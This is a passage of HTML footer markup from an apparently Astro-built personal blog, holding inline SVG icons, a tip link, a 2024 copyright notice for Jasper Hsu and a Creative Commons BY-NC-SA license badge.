                        <path d="M8.358 20.162c-1.186-1.07-1.532-3.316-1.038-4.944c.856 1.026 2.043 1.352 3.272 1.535c1.897.283 3.76.177 5.522-.678c.202-.098.388-.229.608-.36c.166.473.209.95.151 1.437c-.14 1.185-.738 2.1-1.688 2.794c-.38.277-.782.525-1.175.787c-1.205.804-1.531 1.747-1.078 3.119l.044.148a3.158 3.158 0 0 1-1.407-1.188a3.31 3.31 0 0 1-.544-1.815c-.004-.32-.004-.642-.048-.958c-.106-.769-.472-1.113-1.161-1.133c-.707-.02-1.267.411-1.415 1.09c-.012.053-.028.104-.045.165h.002zm-5.961-4.445s3.24-1.575 6.49-1.575l2.451-7.565c.092-.366.36-.614.662-.614c.302 0 .57.248.662.614l2.45 7.565c3.85 0 6.491 1.575 6.491 1.575L16.088.727C15.93.285 15.663 0 15.303 0H8.697c-.36 0-.615.285-.784.727l-5.516 14.99z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:astro></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>打赏</p>
                </div>
            </span>
            </a>
            <span class=entry data-astro-cid-p3givckg>
                <svg xmlns="http://www.w3.org/2000/svg" class=heading data-astro-cid-p3givckg data-icon=simple-icons:copyright width="1em" height="1em" viewBox="0 0 24 24">
                    <title>Copyright</title>
                    <path fill="currentColor" d="M19 2a3 3 0 0 1 3 3v14a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3zm-5 5h-4a1 1 0 0 0-1 1l.007.117A1 1 0 0 0 10 9h3v5a1 1 0 0 1-1.993.117L11 14a1 1 0 0 0-2 0a3 3 0 0 0 6 0V8a1 1 0 0 0-1-1" />
                    <use xlink:href=#ai:simple-icons:copyright></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>© 2024 Jasper Hsu</p>
                </div>
            </span>
        </div>
        <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="list license" data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Creative Commons</title>
                    <symbol id=ai:fa6-brands:creative-commons>
                        <path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86zm143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86zM247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248zm.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Creative Commons</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-by height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Attribute</title>
                    <symbol id=ai:fa6-brands:creative-commons-by>
                        <path d="M314.9 194.4v101.4h-28.3v120.5h-77.1V295.9h-28.3V194.4c0-4.4 1.6-8.2 4.6-11.3c3.1-3.1 6.9-4.7 11.3-4.7H299c4.1 0 7.8 1.6 11.1 4.7c3.1 3.2 4.8 6.9 4.8 11.3zm-101.5-63.7c0-23.3 11.5-35 34.5-35s34.5 11.7 34.5 35c0 23-11.5 34.5-34.5 34.5s-34.5-11.5-34.5-34.5zM247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-by></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Attribute</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-nc height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Noncommercial</title>
                    <symbol id=ai:fa6-brands:creative-commons-nc>
                        <path d="M247.6 8C387.4 8 496 115.9 496 256c0 147.2-118.5 248-248.4 248C113.1 504 0 393.2 0 256C0 123.1 104.7 8 247.6 8zM55.8 189.1c-7.4 20.4-11.1 42.7-11.1 66.9c0 110.9 92.1 202.4 203.7 202.4c122.4 0 177.2-101.8 178.5-104.1l-93.4-41.6c-7.7 37.1-41.2 53-68.2 55.4v38.1h-28.8V368c-27.5-.3-52.6-10.2-75.3-29.7l34.1-34.5c31.7 29.4 86.4 31.8 86.4-2.2c0-6.2-2.2-11.2-6.6-15.1c-14.2-6-1.8-.1-219.3-97.4zM248.4 52.3c-38.4 0-112.4 8.7-170.5 93l94.8 42.5c10-31.3 40.4-42.9 63.8-44.3v-38.1h28.8v38.1c22.7 1.2 43.4 8.9 62 23L295 199.7c-42.7-29.9-83.5-8-70 11.1c53.4 24.1 43.8 19.8 93 41.6l127.1 56.7c4.1-17.4 6.2-35.1 6.2-53.1c0-57-19.8-105-59.3-143.9c-39.3-39.9-87.2-59.8-143.6-59.8z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-nc></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Noncommercial</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-sa height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Share Alike</title>
                    <symbol id=ai:fa6-brands:creative-commons-sa>
                        <path d="M247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3zM137.7 221c13-83.9 80.5-95.7 108.9-95.7c99.8 0 127.5 82.5 127.5 134.2c0 63.6-41 132.9-128.9 132.9c-38.9 0-99.1-20-109.4-97h62.5c1.5 30.1 19.6 45.2 54.5 45.2c23.3 0 58-18.2 58-82.8c0-82.5-49.1-80.6-56.7-80.6c-33.1 0-51.7 14.6-55.8 43.8h18.2l-49.2 49.2l-49-49.2h19.4z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-sa></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Share Alike</p>
                </div>
            </span>
        </a>
    </div>
</footer>
</footer>
</body>
</html>
